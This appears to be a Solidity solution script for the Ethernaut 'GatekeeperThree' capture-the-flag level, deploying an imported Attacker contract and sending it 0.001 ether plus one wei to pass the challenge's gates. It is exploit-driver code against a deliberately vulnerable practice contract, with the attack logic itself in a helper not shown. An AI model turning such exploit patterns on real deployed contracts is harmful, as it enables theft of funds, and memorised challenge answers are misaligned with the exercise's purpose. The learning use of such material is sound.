// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {CheckScript} from "./common/Check.sol";
import {SolveScript} from "./common/Solve.sol";
import {GatekeeperThree} from "ethernaut/levels/GatekeeperThree.sol";
import {Attacker} from "~/helpers/GatekeeperThree.sol";

contract Check is CheckScript("GATEKEEPER_THREE") {}

contract Solve is SolveScript("GATEKEEPER_THREE") {
    GatekeeperThree target;

    constructor() {
        target = GatekeeperThree(instance);
    }

    function attack() public override {
        Attacker attacker = new Attacker();

        // 0.001 ether is hardcoded in the challenge
        attacker.enter{value: 0.001 ether + 1}(target);
    }
}
